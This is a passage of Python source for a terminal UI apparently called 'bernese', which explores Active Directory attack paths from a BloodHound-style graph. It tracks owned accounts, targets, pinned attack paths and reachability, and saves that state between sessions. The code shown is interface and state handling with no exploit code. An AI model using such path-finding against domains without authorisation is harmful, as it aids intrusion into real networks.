    .pathrow { height: 1; margin-bottom: 1; }
    .pathlbl { width: 6; }
    #patha, #pathb { width: 1fr; height: 1; border: none; padding: 0 1;
                     background: #3a4656; color: #ffffff; }
    #patha:focus, #pathb:focus { background: #1d5f99; color: #ffffff; text-style: bold; }
    #patha > .input--placeholder, #pathb > .input--placeholder { color: #b8c2cc; }
    .pathlbl { color: #ffffff; text-style: bold; }
    .pathsel { width: 16; padding: 0 1; }
    #pathhitshdr { height: 1; }
    #pathhits { height: auto; max-height: 7; border: none; background: transparent; }
    #pathkeys { height: auto; }
    PathView #tree { height: 1fr; }
    #exportlist { height: auto; max-height: 70%; border: round $primary; margin: 1 2; }
    #exportbtn { margin: 0 2 1 2; width: auto; }
    #maqtree { height: 1fr; border: round $primary; }
    TextPane { height: 1fr; border: round $primary; padding: 0 1; overflow-x: auto; overflow-y: auto; }
    TextPane #body { width: auto; }
    PrincipalTable { height: 1fr; }
    PrincipalTable #tblhelp { height: auto; padding: 0 1; }
    PrincipalTable DataTable { width: 1fr; height: 1fr; border: round $primary; }
    OptionList { scrollbar-size-vertical: 1; }
    Input { border: tall $accent; }
    /* version tag — overlaid on the right of the footer row (where the palette hint was) */
    Screen { layers: base version; }
    #version {
        layer: version; dock: bottom; height: 1; width: auto;
        padding: 0 1; background: $footer-background; color: $text-muted;
    }
    """
    TITLE = "bernese"
    BINDINGS = [Binding("question_mark", "help", "Help")]

    def action_help(self):
        if not isinstance(self.screen, HelpScreen):
            self.push_screen(HelpScreen())

    def __init__(self, g, restore=True):
        super().__init__()
        bh.C.enabled = False      # TUI renders colour via rich, not ANSI
        self._restore = restore
        self._saved = None                  # last snapshot written to the state file
        self.g = g
        self.priv = bh._priv_set(g)
        self.prof = {}                      # sid -> (_user_profile) cache, shared across screens
        self.power = {}                     # has_power memo (dead-end membership pruning)
        self.owned = set()                  # sids the operator has marked as owned
        self.start = None                   # current start node (its tree is shown on Home)
        self.targets = set()                # sids marked as targets (^t)
        self.paths = []                     # (src, dst) paths pinned to the attack tree
        self.path_pick = [None, None]       # last FROM / TO picked in the path view
        self._reach = (None, {})            # (frozenset(owned), reach_from result) cache
        self.sub_title = (g.domain_name or "?")

    def owned_reach(self):
        """{sid: (dist, origin, parent, lbl)} for everything the owned set can reach —
        recomputed only when the owned set changes."""
        key = frozenset(self.owned)
        if self._reach[0] != key:
            self._reach = (key, self.g.reach_from(key) if key else {})
        return self._reach[1]

    def on_mount(self):
        restored = bh.load_state(self.g) if self._restore else None
        if restored:
            self.owned = set(restored["owned"])
            self.targets = set(restored["targets"])
            self.start = restored["start"]
            self.paths = list(restored.get("paths", []))
        self._saved = self._snapshot()
        self.push_screen(HomeScreen(self.g))
        if restored and (self.owned or self.targets or self.start or self.paths):
            bits = [f"{len(self.owned)} owned", f"{len(self.targets)} target(s)"]
            if self.start:
                bits.append("start " + short(self.g, self.start))
            if self.paths:
                bits.append(f"{len(self.paths)} pinned path(s)")
            self.notify("restored saved state: " + ", ".join(bits)
                        + " — menu › Reset saved state to clear", timeout=6)
        self.set_interval(1.0, self._autosave)

    def on_unmount(self):
        self._autosave()                    # don't lose a change made inside the last tick

    def _snapshot(self):
        return (frozenset(self.owned), frozenset(self.targets), self.start, tuple(self.paths))

    def _autosave(self):
        snap = self._snapshot()
        if snap != self._saved:
            self._saved = snap
            bh.save_state(self.g, self.owned, self.targets, self.start, self.paths)

    def reset_state(self):
        """Forget owned / targets / start for this domain, on disk and in the session."""
        bh.clear_state(self.g)
        self.owned.clear()
        self.targets.clear()
        self.start = None
        self.paths = []
        self.path_pick = [None, None]
        self._saved = self._snapshot()
        while len(self.screen_stack) > 2:
            self.pop_screen()
        h = self._home()
        if h:
            h.reset_view()
        self.notify("saved state cleared")

    def _home(self):
        return next((s for s in reversed(self.screen_stack) if isinstance(s, HomeScreen)), None)

    def open_start(self, sid):
        self.start = sid
        while len(self.screen_stack) > 2:       # drop any overlay (e.g. node info)
            self.pop_screen()
        h = self._home()
        if h:
            h.open_start(sid)

    def show_list(self, title, sids):
        while len(self.screen_stack) > 2:
            self.pop_screen()
        h = self._home()
        if h:
            h.show_list(title, sids)

    def show_node_info(self, sid):
        while len(self.screen_stack) > 2:
            self.pop_screen()
        h = self._home()
        if h:
            h.show_node_info(sid)

    def set_detail(self, sid=None, intro=None):
        h = self._home()
        if h:
            h.set_detail(sid, intro)

    def action_home(self):
        while len(self.screen_stack) > 2:
            self.pop_screen()


if __name__ == "__main__":
    main()
